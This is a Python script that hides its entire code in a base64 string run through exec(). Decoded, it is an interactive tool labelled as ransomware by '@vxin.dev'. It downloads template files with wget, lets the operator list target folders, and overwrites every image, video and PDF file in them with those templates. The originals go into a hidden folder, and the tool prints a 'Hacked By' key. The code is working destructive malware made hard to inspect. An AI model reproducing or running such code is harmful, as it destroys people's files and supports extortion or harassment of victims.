import base64
exec(base64.b64decode(b'IyEvYmluL3B5dGhvbgojY29kaW5nOiB1dGYtOAoKaW1wb3J0IG9zLCBzeXMsIHRpbWUsIGRhdGV0aW1lLCBqc29uLCBzaHV0aWwsIGhhc2hsaWIsIHJhbmRvbSwgYmFzZTY0LCByZWFkbGluZQoKYXJyYXkgPSBbXQoKY2xhc3MgYXV0byhvYmplY3QpOgoJZGVmIF9faW5pdF9fKHNlbGYsIG9wdGlvbnMpOgoJCXNlbGYub3B0aW9ucyA9IHNvcnRlZChvcHRpb25zKQoJCglkZWYgY29tcGxldGUoc2VsZiwgdGV4dCwgc3RhdGUpOgoJCWlmIHN0YXRlID09IDA6CgkJCWlmIHRleHQ6CgkJCQlzZWxmLm1hdGNoZXMgPSBbcyBmb3IgcyBpbiBzZWxmLm9wdGlvbnMgaWYgcyBhbmQgcy5zdGFydHN3aXRoKHRleHQpXQoJCQllbHNlOgoJCQkJc2VsZi5tYXRjaGVzID0gc2VsZi5vcHRpb25zWzpdCgkJdHJ5OgoJCQlyZXR1cm4gc2VsZi5tYXRjaGVzW3N0YXRlXQoJCWV4Y2VwdCBJbmRleEVycm9yOgoJCQlyZXR1cm4gTm9uZQoKZGVmIGNvbXBsZXRlKGFycmF5KToKCWNvbXBsZXRlciA9IGF1dG8oYXJyYXkpCglyZWFkbGluZS5zZXRfY29tcGxldGVyKGNvbXBsZXRlci5jb21wbGV0ZSkKCXJlYWRsaW5lLnBhcnNlX2FuZF9iaW5kKCd0YWI6Y29tcGxldGUnKQoKZGVmIGxvYWRpbmdTY3JlZW4obXNnLCBtc2dJZkRvbmUgPSAiICAgICIpOgoJYmFycyA9IFsKCQlmIlsqXSB7bXNnfSAuICAgLSIsCgkJZiJbKl0ge21zZ30gLi4gIHwiLAoJCWYiWypdIHttc2d9IC4uLiBcXCIsCgkJZiJbKl0ge21zZ30gLiAgIC8iLAoJCWYiWypdIHttc2d9IC4gICAtIiwKCQlmIlsqXSB7bXNnfSAuLiAgfCIsCgkJZiJbKl0ge21zZ30gLi4uIFxcIiwKCQlmIlsqXSB7bXNnfSAuICAgLyIsCgkJZiJbKl0ge21zZ30gLiAgIC0iLAoJCWYiWypdIHttc2d9IC4uICB8IiwKCQlmIlsqXSB7bXNnfSAuLi4gXFwiLAoJCWYiWypdIHttc2d9IC4gICAvIiwKCQlmIlsqXSB7bXNnfSAuICAgLSIsCgkJZiJbKl0ge21zZ30gLi4gIHwiLAoJCWYiWypdIHttc2d9IC4uLiBcXCIsCgkJZiJbKl0ge21zZ30gLiAgIC8iLAoJCWYiWypdIHttc2d9IC4gICAtIiwKCQlmIlsqXSB7bXNnfSAuLiAgfCIsCgkJZiJbKl0ge21zZ30gLi4uIFxcIiwKCQlmIlsqXSB7bXNnfSAuICAgLyIsCgkJZiJbKl0ge21zZ30gLiAgIC0iLAoJCWYiWypdIHttc2d9IC4uICB8IiwKCQlmIlsqXSB7bXNnfSAuLi4gXFwiLAoJCWYiWypdIHttc2d9IC4gICAvIiwKCQlmIlsqXSB7bXNnfSAuLi4ge21zZ0lmRG9uZX0iCgldCglmb3IgaSBpbiByYW5nZShsZW4oYmFycykpOgoJCXRpbWUuc2xlZXAoMS4vcmFuZG9tLnJhbmRpbnQoMSwgMTApKQoJCXN5cy5zdGRvdXQud3JpdGUoZiJccntiYXJzW2ldfSIpCgkJc3lzLnN0ZG91dC5mbHVzaCgpCglwcmludCgiIikKCXRpbWUuc2xlZXAoMikKCmJhbm5lciA9ICIiIgogIF9fXyAgX19fICBfIF8gIF9fXyAgX19fICBfXyBfXyAgX19fICBfIF8gXyAgX19fICBfX18gIF9fXyAKIHwgLiBcfCAuIHx8IFwgfC8gX18+fCAuIHx8ICBcICBcfCBfXz58IHwgfCB8fCAuIHx8IC4gXHwgX18+CiB8ICAgL3wgICB8fCAgIHxcX18gXHwgfCB8fCAgICAgfHwgXz4gfCB8IHwgfHwgICB8fCAgIC98IF8+IAogfF9cX1x8X3xffHxfXF98PF9fXy9gX19fJ3xffF98X3x8X19fPnxfXy9fLyB8X3xffHxfXF9cfF9fXz4KICAgIENvZGUgYnkgQHZ4aW4uZGV2ICAgICAgWyBweXRob24gXSAgICAgdmVyc2lvbiAxLjUtZGV2CiIiIgoKZGVmIHN0YXJ0QmFubmVyKCk6CglwcmludChiYW5uZXIpCgppZiBvcy5wYXRoLmV4aXN0cygiLnJhbnNvbWV3YXJlIik6CglwYXNzCmVsc2U6Cglvcy5ta2RpcigiLnJhbnNvbWV3YXJlIikKCW9wZW4oIi5yYW5zb21ld2FyZS8ucGF0aHMuanNvbiIsICJ3Iikud3JpdGUoanNvbi5kdW1wcyh7CgkJInBhdGhzIjogW10KCX0sIGluZGVudD00KSkKCQoJaWYgb3MucGF0aC5leGlzdHMoImFzc2V0cy90ZW1wbGF0ZXMiKToKCQlwYXNzCgllbHNlOgoJCW9zLm1ha2VkaXJzKCJhc3NldHMvdGVtcGxhdGVzIikKCQlvcy5zeXN0ZW0oIndnZXQgLU8gYXNzZXRzL3RlbXBsYXRlcy90ZW1wbGF0ZV9qcGcueCBodHRwczovL2dpdGh1Yi5jb20vdkhhY2tzLWRldmVsb3BtZW50L3RlbXBsYXRlcy9yYXcvbWFpbi90ZW1wbGF0ZV9qcGcueCA+PiAucmFuc29tZXdhcmUvLnJhbnNvbWV3YXJlLmxvZyIpCgkJb3Muc3lzdGVtKCJ3Z2V0IC1PIGFzc2V0cy90ZW1wbGF0ZXMvdGVtcGxhdGVfbXA0LnggaHR0cHM6Ly9naXRodWIuY29tL3ZIYWNrcy1kZXZlbG9wbWVudC90ZW1wbGF0ZXMvcmF3L21haW4vdGVtcGxhdGVfbXA0LnggPj4gLnJhbnNvbWV3YXJlLy5yYW5zb21ld2FyZS5sb2ciKQoJCW9zLnN5c3RlbSgid2dldCAtTyBhc3NldHMvdGVtcGxhdGVzL3RlbXBsYXRlX3BkZi54IGh0dHBzOi8vZ2l0aHViLmNvbS92SGFja3MtZGV2ZWxvcG1lbnQvdGVtcGxhdGVzL3Jhdy9tYWluL3RlbXBsYXRlX3BkZi54ID4+IC5yYW5zb21ld2FyZS8ucmFuc29tZXdhcmUubG9nIikKCnRlbXBsYXRlSnBnID0gb3BlbigiYXNzZXRzL3RlbXBsYXRlcy90ZW1wbGF0ZV9qcGcueCIsICJyYiIpLnJlYWQoKQp0ZW1wbGF0ZU1wNCA9IG9wZW4oImFzc2V0cy90ZW1wbGF0ZXMvdGVtcGxhdGVfbXA0LngiLCAicmIiKS5yZWFkKCkKdGVtcGxhdGVQZGYgPSBvcGVuKCJhc3NldHMvdGVtcGxhdGVzL3RlbXBsYXRlX3BkZi54IiwgInJiIikucmVhZCgpCgp0aW1lLnNsZWVwKDIpCnByaW50KCJcMDMzW0hcMDMzW0oiKQpzdGFydEJhbm5lcigpCgpkZWYgcmFuc29tZXdhcmVIZWxwKCk6CglwcmludCgiIikKCXByaW50KCJDT1JFIENPTU1BTkRTIikKCXByaW50KCI9PT09PT09PT09PT09IikKCXByaW50KCIiKQoJcHJpbnQoIlx0Q29tbWFuZCAgICAgRGVzY3JpcHRpb24iKQoJcHJpbnQoIlx0LS0tLS0tLSAgICAgLS0tLS0tLS0tLS0iKQoJcHJpbnQoIlx0YWRkICAgICAgICAgQWRkIHRoZSBmb2xkZXIgdG8gdGhlIGZvbGRlciBsaXN0IikKCXByaW50KCJcdGRlbCAgICAgICAgIFJlbW92ZSB0aGUgZm9sZGVyIGZyb20gdGhlIGZvbGRlciBsaXN0IikKCXByaW50KCJcdGluZm8gICAgICAgIFZpZXcgdGhlIGxpc3Qgb2YgZm9sZGVycyIpCglwcmludCgiXHRlbmNyeXB0ICAgICBSdW4gdGhlIHZpcnVzIGFuZCBzdGFydCBmaWxlIGVuY3J5cHRpb24iKQoJcHJpbnQoIiIpCgp3aGlsZSBUcnVlOgoJdHJ5OgoJCXByb21wdCA9IGlucHV0KCJyYW5zb21ld2FyZSA+ICIpLnNwbGl0KCkKCQlpZiBwcm9tcHRbMF0gPT0gImhlbHAiIG9yIHByb21wdFswXSA9PSAiPyI6CgkJCXJhbnNvbWV3YXJlSGVscCgpCgkJZWxpZiBwcm9tcHRbMF0gPT0gImFkZCI6CgkJCXByaW50KCIiKQoJCQl0cnk6CgkJCQlpZiBvcy5wYXRoLmV4aXN0cyhwcm9tcHRbMV0pOgoJCQkJCWYgPSBqc29uLmxvYWRzKG9wZW4oIi5yYW5zb21ld2FyZS8ucGF0aHMuanNvbiIsICJyIikucmVhZCgpKQoJCQkJCWlmIGYiJ3twcm9tcHRbMV19JyIgaW4gc3RyKGZbInBhdGhzIl0pOgoJCQkJCQlwcmludCgiWypdIFRoaXMgZm9sZGVyIGFscmVhZHkgZXhpc3RzIikKCQkJCQllbHNlOgoJCQkJCQlmWyJwYXRocyJdLmFwcGVuZChwcm9tcHRbMV0pCgkJCQkJCW9wZW4oIi5yYW5zb21ld2FyZS8ucGF0aHMuanNvbiIsICJ3Iikud3JpdGUoanNvbi5kdW1wcyhmLCBpbmRlbnQ9NCkpCgkJCQkJCXByaW50KGYiWypdIFRoZSB7cHJvbXB0WzFdfSBmb2xkZXIgaGFzIGJlZW4gYWRkZWQgdG8gdGhlIGxpc3QiKQoJCQkJZWxzZToKCQkJCQlwcmludChmIlsqXSBUaGUge3Byb21wdFsxXX0gZm9sZGVyIGNhbm5vdCBiZSBhZGRlZCIpCgkJCWV4Y2VwdCBJbmRleEVycm9yOiAKCQkJCXByaW50KCJbKl0gUGxlYXNlIGVudGVyIHRoZSBuYW1lIG9mIHRoZSBmb2xkZXIgeW91IHdhbnQgdG8gYWRkIikKCQkJcHJpbnQoIiIpCgkJZWxpZiBwcm9tcHRbMF0gPT0gImRlbCI6CgkJCXByaW50KCIiKQoJCQlpZiBwcm9tcHRbMV0gPT0gImFsbCI6CgkJCQlvcGVuKCIucmFuc29tZXdhcmUvLnBhdGhzLmpzb24iLCAidyIpLndyaXRlKGpzb24uZHVtcHMoewoJCQkJCSJwYXRocyI6IFtdCgkJCQl9LCBpbmRlbnQ9NCkpCgkJCQlwcmludCgiWypdIEFsbCBmb2xkZXJzIGhhdmUgYmVlbiByZW1vdmVkIGZyb20gdGhlIGxpc3QiKQoJCQllbHNlOgoJCQkJdHJ5OgoJCQkJCWYgPSBqc29uLmxvYWRzKG9wZW4oIi5yYW5zb21ld2FyZS8ucGF0aHMuanNvbiIsICJyIikucmVhZCgpKQoJCQkJCWlmIGYiJ3twcm9tcHRbMV19JyIgaW4gc3RyKGZbInBhdGhzIl0pOgoJCQkJCQlmWyJwYXRocyJdLnJlbW92ZShwcm9tcHRbMV0pCgkJCQkJCW9wZW4oIi5yYW5zb21ld2FyZS8ucGF0aHMuanNvbiIsICJ3Iikud3JpdGUoanNvbi5kdW1wcyhmLCBpbmRlbnQ9NCkpCgkJCQkJCXByaW50KGYiVGhlIHtwcm9tcHRbMV19IGZvbGRlciBoYXMgYmVlbiByZW1vdmVkIGZyb20gdGhlIGxpc3QiKQoJCQkJCWVsc2U6CgkJCQkJCXByaW50KGYiWypdIFRoZSB7cHJvbXB0WzFdfSBmb2xkZXIgaXMgbm90IGluIHRoZSBsaXN0IikKCQkJCWV4Y2VwdCBJbmRleEVycm9yOgoJCQkJCXByaW50KCJbKl0gUGxlYXNlIGVudGVyIHRoZSBuYW1lIG9mIHRoZSBmb2xkZXIgeW91IHdhbnQgdG8gZGVsZXRlIikKCQkJcHJpbnQoIiIpCgkJZWxpZiBwcm9tcHRbMF0gPT0gImluZm8iOgoJCQlwcmludCgiIikKCQkJZiA9IGpzb24ubG9hZHMob3BlbigiLnJhbnNvbWV3YXJlLy5wYXRocy5qc29uIiwgInIiKS5yZWFkKCkpWyJwYXRocyJdCgkJCXByaW50KCJbKl0gTGlzdCB0aGUgZm9sZGVycyB5b3Ugd2FudCB0byBlbmNyeXB0XG4iKQoJCQl0b3RhbEZvbGRlciA9IDAKCQkJZm9yIHBhdGggaW4gZjoKCQkJCXByaW50KGYiICB+IHtwYXRofSIpCgkJCQl0b3RhbEZvbGRlciArPSAxCgkJCXByaW50KCIiKQoJCQlwcmludChmInt0b3RhbEZvbGRlcn0gRm9sZGVycyBsaXN0ZWQiKQoJCQlwcmludCgiIikKCQllbGlmIHByb21wdFswXSA9PSAiZW5jcnlwdCI6CgkJCSNTdGFydCBlbmNyeXB0CgkJCXByaW50KCIiKQoJCQlsb2FkaW5nU2NyZWVuKCJTdGFydCBlbmNyeXB0aW5nIikKCQkJaWYgb3MucGF0aC5leGlzdHMoIi5yYW5zb21ld2FyZS8uZGVjcnlwdC5rZXkiKToKCQkJCXByaW50KCJbKl0gWW91IGNhbid0IGVuY3J5cHQiKQoJCQllbHNlOgoJCQkJbnVtID0gMAoJCQkJbG9hZGluZ1NjcmVlbigiRW5jcnlwdCBhbGwgZmlsZXMiKQoJCQkJZm9yIHBhdGggaW4ganNvbi5sb2FkcyhvcGVuKCIucmFuc29tZXdhcmUvLnBhdGhzLmpzb24iLCAiciIpLnJlYWQoKSlbInBhdGhzIl06CgkJCQkJaWYgb3MucGF0aC5leGlzdHMocGF0aCk6CgkJCQkJCXRyeToKCQkJCQkJCW9zLm1ha2VkaXJzKGYiLnJhbnNvbWV3YXJlLy5zYXZlL3twYXRofSIpCgkJCQkJCWV4Y2VwdCBGaWxlRXhpc3RzRXJyb3I6CgkJCQkJCQlwYXNzCgkJCQkJCWZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aCk6CgkJCQkJCQlpZiBmaWxlWy00Ol0gPT0gIi5qcGciIG9yIGZpbGVbLTQ6XSA9PSAiLnBuZyI6CgkJCQkJCQkJZiA9IG9wZW4oZiJ7cGF0aH0ve2ZpbGV9IiwgInJiIikKCQkJCQkJCQlvcGVuKGYiLnJhbnNvbWV3YXJlLy5zYXZlL3twYXRofS97ZmlsZX0uZW5jcnlwdCIsICJ3YiIpLndyaXRlKGJhc2U2NC5iNjRlbmNvZGUoZi5yZWFkKCkpKQoJCQkJCQkJCW9wZW4oZiJ7cGF0aH0ve2ZpbGV9IiwgIndiIikud3JpdGUodGVtcGxhdGVKcGcpCgkJCQkJCQkJbnVtICs9IDEKCQkJCQkJCWVsaWYgZmlsZVstNDpdID09ICIubXA0IjoKCQkJCQkJCQlmID0gb3BlbihmIntwYXRofS97ZmlsZX0iLCAicmIiKQoJCQkJCQkJCW9wZW4oZiIucmFuc29tZXdhcmUvLnNhdmUve3BhdGh9L3tmaWxlfS5lbmNyeXB0IiwgIndiIikud3JpdGUoYmFzZTY0LmI2NGVuY29kZShmLnJlYWQoKSkpCgkJCQkJCQkJb3BlbihmIntwYXRofS97ZmlsZX0iLCAid2IiKS53cml0ZSh0ZW1wbGF0ZU1wNCkKCQkJCQkJCQludW0gKz0gMQoJCQkJCQkJZWxpZiBmaWxlWy00Ol0gPT0gIi5wZGYiOgoJCQkJCQkJCWYgPSBvcGVuKGYie3BhdGh9L3tmaWxlfSIsICJyYiIpCgkJCQkJCQkJb3BlbihmIi5yYW5zb21ld2FyZS8uc2F2ZS97cGF0aH0ve2ZpbGV9LmVuY3J5cHQiLCAid2IiKS53cml0ZShiYXNlNjQuYjY0ZW5jb2RlKGYucmVhZCgpKSkKCQkJCQkJCQlvcGVuKGYie3BhdGh9L3tmaWxlfSIsICJ3YiIpLndyaXRlKHRlbXBsYXRlUGRmKQoJCQkJCQkJCW51bSArPSAxCgkJCQkJZWxzZToKCQkJCQkJcGFzcwoJCQkJZ2VuS2V5ID0gaGFzaGxpYi5zaGEyNTYoZiJIYWNrZWQgQnkgQFZ4aW4uRGV2IF5fXiAtIENvZGU6IHtyYW5kb20ucmFuZGludCgyMDAsIDQwNCl9Ii5lbmNvZGUoInV0Zi04IikpLmhleGRpZ2VzdCgpCgkJCQlvcGVuKCIucmFuc29tZXdhcmUvLmRlY3J5cHQua2V5IiwgInciKS53cml0ZShqc29uLmR1bXBzKHsKCQkJCQkia2V5IjogZ2VuS2V5CgkJCQl9LCBpbmRlbnQ9MikpCgkJCQlvcy5zeXN0ZW0oZiJ6aXAgLXIgLnJhbnNvbWV3YXJlLy5zYXZlL3JhbnNvbWV3YXJlX3tkYXRldGltZS5kYXRldGltZS5ub3coKS5zdHJmdGltZSgnJWQtJW0tJXktJUglTSVTJyl9LnppcCAucmFuc29tZXdhcmUvLnNhdmUvc2RjYXJkID4+IC5yYW5zb21ld2FyZS8ucmFuc29tZXdhcmUubG9nIikKCQkJCQoJCQkJI01lc3NhZ2UgV2hlbiBEb25lIEVuY3J5cHQKCQkJCXByaW50KCJcMDMzW0FbKl0gRW5jcnlwdCBhbGwgZmlsZXMgLi4uIGRvbmUiKQoJCQkJcHJpbnQoZiJbKl0ge251bX0gRmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZCIpCgkJCQlwcmludChmIlsqXSBLZXkgdG8gZGVjcnlwdDoge2dlbktleX0iKQoJCQlwcmludCgiIikKCQllbHNlOgoJCQlwcmludChmIlsqXSBDb21tYW5kIG5vdCBmb3VuZDoge3Byb21wdFswXX0iKQoJZXhjZXB0IEluZGV4RXJyb3I6CgkJcGFzcwoJZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OiAKCQlwcmludCgiXG5bKl0gRXhpdCB0aGUgY29uc29sZVxuIikKCQlicmVhaw=='))